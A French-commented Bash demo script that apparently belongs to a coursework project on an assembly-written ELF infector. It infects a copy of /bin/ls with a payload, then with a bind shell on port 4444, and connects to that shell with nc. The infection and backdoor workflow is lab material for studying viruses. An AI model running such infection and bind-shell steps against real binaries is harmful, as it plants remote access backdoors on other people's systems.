#!/bin/bash
# Démonstration Personne A — Moteur d'infection ELF en pur ASM

cd "$(dirname "$0")"

echo "=========================================="
echo "  DÉMO — Moteur d'infection ELF (Personne A)"
echo "  Version : 100% ASM (syscalls directs)"
echo "=========================================="
echo ""

# ---------- 1. Compilation ----------
echo "=== 1. Compilation du moteur ASM ==="
nasm -f elf64 elf_parser.asm -o elf_parser.o
ld -o elf_parser elf_parser.o
echo "[OK] elf_parser compilé"
echo ""

# ---------- 2. Mode lecture ----------
echo "=== 2. Mode lecture (avant infection) ==="
cp /bin/ls ls_inf
./elf_parser ls_inf | head -25
echo ""

# ---------- 3. Injection + vérification ----------
echo "=== 3. Injection du payload (sc_msg.bin) ==="
./elf_parser ls_inf sc_msg.bin
echo ""

echo "--- Segment infecté (R E) ---"
readelf -l ls_inf | grep -A1 "R E" | tail -4
echo ""

# ---------- 4. Test retour e_entry ----------
echo "=== 4. Test du retour e_entry ==="
echo "--- ./ls_inf --version ---"
./ls_inf --version 2>&1 || true
echo ""
echo "[INFO] Segfault à l'exit attendu (cosmétique)"
echo ""

# ---------- 5. Bind shell ----------
echo "=== 5. Bind shell (obligation minimale) ==="
pkill -9 ls_inf 2>/dev/null || true
fuser -k 4444/tcp 2>/dev/null || true
cp /bin/ls ls_inf
./elf_parser ls_inf bind_shell.bin
echo ""
echo "Lancement du binaire infecté en arrière-plan..."
./ls_inf &
sleep 1
echo ""
echo "Connexion au bind shell..."
echo "whoami
exit" | nc 127.0.0.1 4444
pkill -9 ls_inf 2>/dev/null || true
echo ""

echo "=========================================="
echo "  FIN DE LA DÉMO"
echo "=========================================="
